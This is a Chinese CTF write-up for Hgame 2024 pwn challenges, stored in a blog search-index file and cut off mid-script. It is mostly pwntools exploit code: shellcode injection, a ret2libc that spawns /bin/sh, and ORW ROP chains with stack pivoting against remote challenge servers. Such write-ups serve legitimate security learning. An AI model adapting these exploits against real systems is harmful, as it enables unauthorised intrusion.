<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Hgame2024复现</title>
    <link href="/2024/03/23/Hgame2024/"/>
    <url>/2024/03/23/Hgame2024/</url>
    
    <content type="html"><![CDATA[<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="0-签到"><a href="#0-签到" class="headerlink" title="0 签到"></a>0 签到</h4><ul><li>直接nc</li></ul><h4 id="1-ezshellcode"><a href="#1-ezshellcode" class="headerlink" title="1 ezshellcode"></a>1 ezshellcode</h4><ul><li><p>明文shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;47.100.139.115&quot;</span>,<span class="hljs-number">31134</span>)<br><br>io.sendlineafter(<span class="hljs-string">&quot;length of your shellcode:&quot;</span>, <span class="hljs-string">b&#x27;-1&#x27;</span>)<br>shellcode = <span class="hljs-string">b&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span><br>io.sendafter(<span class="hljs-string">&quot;shellcode:&quot;</span>, shellcode)<br><br>io.interactive()<br></code></pre></td></tr></table></figure></li></ul><h4 id="2-Elden-Random-Challenge"><a href="#2-Elden-Random-Challenge" class="headerlink" title="2 Elden Random Challenge"></a>2 Elden Random Challenge</h4><ul><li><p>伪随机数+ret2libc<br>libc本地得到的不对 然后打远程本来也没想着能通来着 结果通了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;47.100.139.115&quot;</span>, <span class="hljs-number">32002</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>vuln_addr = <span class="hljs-number">0x40125d</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>libc = cdll.LoadLibrary(<span class="hljs-string">&#x27;/home/yech0/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;</span>)<br><br>io.sendlineafter(<span class="hljs-string">&quot;name.&quot;</span>, <span class="hljs-string">b&#x27;yech0&#x27;</span>)<br><br>libc.srand(libc.time(<span class="hljs-number">0</span>))<br><span class="hljs-comment"># while True:</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">99</span>):<br>    num = libc.rand()%<span class="hljs-number">100</span>+<span class="hljs-number">1</span><br>    io.sendafter(<span class="hljs-string">&quot;number:&quot;</span>, <span class="hljs-built_in">int</span>.to_bytes(num, <span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br><br><span class="hljs-comment"># lib = ELF(&#x27;/home/yech0/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;)</span><br>lib = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x0000000000401423</span><br>ret = <span class="hljs-number">0x000000000040101a</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)<br>io.sendafter(<span class="hljs-string">&quot;mind.&quot;</span>, payload)<br>puts_addr = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts&quot;</span>+<span class="hljs-built_in">hex</span>(puts_addr))<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br><br>libc_base = puts_addr - lib.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment"># libc_base = puts_addr - (0x7f8fd9379420-0x7f8fd92f5000)</span><br>system = libc_base + lib.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(lib.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><span class="hljs-comment"># libc = LibcSearcher(&quot;puts&quot;, puts_addr)</span><br><span class="hljs-comment"># libc_base = puts_addr - libc.dump(&quot;puts&quot;)</span><br><span class="hljs-comment"># system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="hljs-comment"># binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;base&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment"># ogg = [0xe3b2e, 0xe3b31, 0xe3b34]</span><br><span class="hljs-comment"># onegadget = libc_base + ogg[2]</span><br>payload2 = <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>) + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)<br><span class="hljs-comment"># payload2 = b&#x27;\x00&#x27;*(0x30) + p64(0) +  p64(onegadget)</span><br>io.sendline(payload2)<br><br>io.interactive()<br></code></pre></td></tr></table></figure></li></ul><h4 id="3-Elden-Ring-Ⅰ"><a href="#3-Elden-Ring-Ⅰ" class="headerlink" title="3 Elden Ring Ⅰ"></a>3 Elden Ring Ⅰ</h4><ul><li><p>开了沙箱禁了execve 栈迁移打orw来着 但不到为啥就卡在shellcode那不执行(段错误)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br><span class="hljs-comment"># io = remote(&quot;47.102.130.35&quot;, 32258)</span><br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/home/yech0/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;</span>)<br>leave_ret = <span class="hljs-number">0x0000000000401290</span><br>ret = <span class="hljs-number">0x000000000040101a</span><br>pop_rdi_ret = <span class="hljs-number">0x00000000004013e3</span><br>read = <span class="hljs-number">0x401276</span><br>bss = <span class="hljs-number">0x4044f0</span><br>addr = <span class="hljs-number">0x404700</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;accord.\n&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>) + p64(bss) + p64(read)<br>io.send(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-comment"># shellcode = shellcraft.open(&#x27;./flag&#x27;)</span><br><span class="hljs-comment"># shellcode += shellcraft.read(3, addr, 0x50)</span><br><span class="hljs-comment"># shellcode += shellcraft.write(1, addr, 0x50)</span><br><span class="hljs-comment"># shellcode = &#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#     push 0x67616c66;</span><br><span class="hljs-comment">#     mov rdi,rsp;</span><br><span class="hljs-comment">#     xor esi,esi;</span><br><span class="hljs-comment">#     push 2;</span><br><span class="hljs-comment">#     pop rax;</span><br><span class="hljs-comment">#     syscall;</span><br><span class="hljs-comment">#     push 3;</span><br><span class="hljs-comment">#     pop rax;</span><br><span class="hljs-comment">#     mov rdi,rax;</span><br><span class="hljs-comment">#     mov rsi,[rsp+0x200];</span><br><span class="hljs-comment">#     mov edx,0x100;</span><br><span class="hljs-comment">#     xor eax,eax;</span><br><span class="hljs-comment">#     syscall;</span><br><span class="hljs-comment">#     mov edi,1;</span><br><span class="hljs-comment">#     mov rsi,[rsp+0x200];</span><br><span class="hljs-comment">#     push 1;</span><br><span class="hljs-comment">#     pop rax;</span><br><span class="hljs-comment">#     syscall;</span><br><span class="hljs-comment">#     &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#  push 0x67616c66</span><br><span class="hljs-comment">#  mov rdi,rsp</span><br><span class="hljs-comment">#  xor esi,esi</span><br><span class="hljs-comment">#  push 2</span><br><span class="hljs-comment">#  pop rax</span><br><span class="hljs-comment">#  syscall</span><br><span class="hljs-comment">#  mov rdi,rax</span><br><span class="hljs-comment">#  mov rsi,rsp</span><br><span class="hljs-comment">#  mov edx,0x100</span><br><span class="hljs-comment">#  xor eax,eax</span><br><span class="hljs-comment">#  syscall</span><br><span class="hljs-comment">#  mov edi,1</span><br><span class="hljs-comment">#  mov rsi,rsp</span><br><span class="hljs-comment">#  push 1</span><br><span class="hljs-comment">#  pop rax</span><br><span class="hljs-comment">#  syscall</span><br><span class="hljs-comment">#  &#x27;&#x27;&#x27;)</span><br>gdb.attach(io)<br>pause()<br>shellcode = asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br><span class="hljs-comment"># payload2 = b&#x27;b&#x27;*(0x100) + p64(bss+0x100) + p64(read)</span><br>payload2 = shellcode.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(ret) + p64(<span class="hljs-number">0x4043f0</span>)<br>io.send(payload2)<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># payload3 = p64(ret) + p64(0x404500) + shellcode</span><br><span class="hljs-comment"># io.sendline(payload3)</span><br><span class="hljs-comment"># io.send(b&#x27;ccc&#x27;)</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure><ul><li>找到一个师傅的wp  可能真是bss段没有权限的问题（之前那个栈迁移的题可以执行可能是因为本题有<code>setvbuf(_bss_start, 0LL, 2, 0LL);</code> 那题是没有的<br>师傅用了mprotect函数就能通</li></ul><hr></li><li><p>师傅们用的都是泄露libc 用libc中的gadget实现read向bss中写 而且不能是shellcode 没执行权限嘛 用gadget写orw(ret2libc那种)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 好奇怪 换了libc成9.7的 但找offset还是要原来的libc才对</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;139.196.183.57&quot;</span>, <span class="hljs-number">32447</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;/home/yech0/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;)</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x00000000004013e3</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x401292</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;accord.\n&#x27;</span>)<br><br>off = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>+<span class="hljs-number">8</span>)<br>payload = off <br>payload += p64(pop_rdi_ret) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>io.send(payload)<br><br>puts_addr = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment"># base = puts_addr - (0x7fd0c0aa1420-0x7fd0c0a1d000)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;base&#x27;</span>+<span class="hljs-built_in">hex</span>(base))<br>read = base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>o = base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>w = base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rdi = base + <span class="hljs-number">0x0000000000023b6a</span><br>rsi = base + <span class="hljs-number">0x000000000002601f</span><br>rdx = base + <span class="hljs-number">0x0000000000142c92</span><br>rax = base + <span class="hljs-number">0x0000000000036174</span>   <span class="hljs-comment"># 返回值</span><br>rsp = base + <span class="hljs-number">0x000000000002f70a</span><br>addr = <span class="hljs-number">0x404500</span><br><br>payload2 = off<br>payload2 += p64(rsi) + p64(addr) + p64(read)<br>payload2 += p64(rsp) + p64(addr+<span class="hljs-number">8</span>)<br>io.send(payload2)<br><br>payload3 = <span class="hljs-string">b&#x27;./flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload3 += p64(rdi) + p64(addr)<br>payload3 += p64(rsi) + p64(<span class="hljs-number">0</span>) + p64(o)<br>payload3 += p64(rdi) + p64(<span class="hljs-number">3</span>)<br>payload3 += p64(rsi) + p64(addr+<span class="hljs-number">0x300</span>)<br>payload3 += p64(rdx) + p64(<span class="hljs-number">0x50</span>) + p64(read)<br>payload3 += p64(rdi) + p64(<span class="hljs-number">1</span>)<br>payload3 += p64(rsi) + p64(addr+<span class="hljs-number">0x300</span>)<br>payload3 += p64(rdx) + p64(<span class="hljs-number">0x50</span>) + p64(w)<br><span class="hljs-comment"># payload3 += p64(main)# chenxi师傅加了ret_addr 不加也能通</span><br>io.send(payload3)<br><br><br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">flag&#123;D0_yoU_F4ncy_7he_E1d3nR1ng?I_D0!&#125;<br></code></pre></td></tr></table></figure><ul><li><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br><span class="hljs-comment"># io = remote(&quot;139.196.183.57&quot;, 32447)</span><br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;/home/yech0/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;)</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x00000000004013e3</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x40125b</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;accord.\n&#x27;</span>)<br><br>off = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>+<span class="hljs-number">8</span>)<br>payload = off <br>payload += p64(pop_rdi_ret) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>io.send(payload)<br><br>puts_addr = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment"># base = puts_addr - (0x7fd0c0aa1420-0x7fd0c0a1d000)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;base&#x27;</span>+<span class="hljs-built_in">hex</span>(base))<br>read = base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>o = base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>w = base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rdi = base + <span class="hljs-number">0x0000000000023b6a</span><br>rsi = base + <span class="hljs-number">0x000000000002601f</span><br>rdx = base + <span class="hljs-number">0x0000000000142c92</span><br>rax = base + <span class="hljs-number">0x0000000000036174</span>   <span class="hljs-comment"># 返回值</span><br>rsp = base + <span class="hljs-number">0x000000000002f70a</span><br>addr = <span class="hljs-number">0x404500</span><br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>) + p64(addr)<br>payload2 += p64(rax) + p64(addr) + p64(<span class="hljs-number">0x401282</span>)<br>payload2 += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>io.send(payload2)<br><br>payload3 = <span class="hljs-string">b&#x27;./flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload3 += p64(rdi) + p64(addr)<br>payload3 += p64(rsi) + p64(<span class="hljs-number">0</span>) + p64(o)<br>payload3 += p64(rdi) + p64(<span class="hljs-number">3</span>)<br>payload3 += p64(rsi) + p64(addr+<span class="hljs-number">0x300</span>)<br>payload3 += p64(rdx) + p64(<span class="hljs-number">0x50</span>) + p64(read)<br>payload3 += p64(rdi) + p64(<span class="hljs-number">1</span>)<br>payload3 += p64(rsi) + p64(addr+<span class="hljs-number">0x300</span>)<br>payload3 += p64(rdx) + p64(<span class="hljs-number">0x50</span>) + p64(w)<br>payload3 += p64(main)<br>io.send(payload3)<br><br><br>io.interactive()<br><br><span class="hljs-comment"># &#x27;./flag&#x27;.ljust(8, b&#x27;\x00&#x27;)写最后也行 payload2的addr调整一下</span><br></code></pre></td></tr></table></figure></li><li><p>这题卡住的原因就是bss没有权限执行shellcode 写rop链就行了<br>修改一下最开始没通的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br><span class="hljs-comment"># io = remote(&quot;139.196.183.57&quot;, 32447)</span><br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;/home/yech0/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;)</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x00000000004013e3</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x40125b</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;accord.\n&#x27;</span>)<br><br>off = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>+<span class="hljs-number">8</span>)<br>payload = off <br>payload += p64(pop_rdi_ret) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>io.send(payload)<br><br>puts_addr = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment"># base = puts_addr - (0x7fd0c0aa1420-0x7fd0c0a1d000)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;base&#x27;</span>+<span class="hljs-built_in">hex</span>(base))<br>read = base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>o = base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>w = base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rdi = base + <span class="hljs-number">0x0000000000023b6a</span><br>rsi = base + <span class="hljs-number">0x000000000002601f</span><br>rdx = base + <span class="hljs-number">0x0000000000142c92</span><br>rax = base + <span class="hljs-number">0x0000000000036174</span>   <span class="hljs-comment"># 返回值</span><br>rsp = base + <span class="hljs-number">0x000000000002f70a</span><br>addr = <span class="hljs-number">0x404500</span><br>readtst = <span class="hljs-number">0x401276</span><br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>) + p64(addr) + p64(readtst)<br>io.send(payload2)<br>payload4 = <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x100</span>) + p64(addr+<span class="hljs-number">0x100</span>) + p64(readtst)<br>io.send(payload4)<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br>payload3 = <span class="hljs-string">b&#x27;./flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload3 += p64(rdi) + p64(addr)<br>payload3 += p64(rsi) + p64(<span class="hljs-number">0</span>) + p64(o)<br>payload3 += p64(rdi) + p64(<span class="hljs-number">3</span>)<br>payload3 += p64(rsi) + p64(addr+<span class="hljs-number">0x300</span>)<br>payload3 += p64(rdx) + p64(<span class="hljs-number">0x50</span>) + p64(read)<br>payload3 += p64(rdi) + p64(<span class="hljs-number">1</span>)<br>payload3 += p64(rsi) + p64(addr+<span class="hljs-number">0x300</span>)<br>payload3 += p64(rdx) + p64(<span class="hljs-number">0x50</span>) + p64(w)<br>payload3 += p64(main)<br>io.send(payload3)<br><br><br>io.interactive()<br></code></pre></td></tr></table></figure></li><li><p>另一种方法：mprotect函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 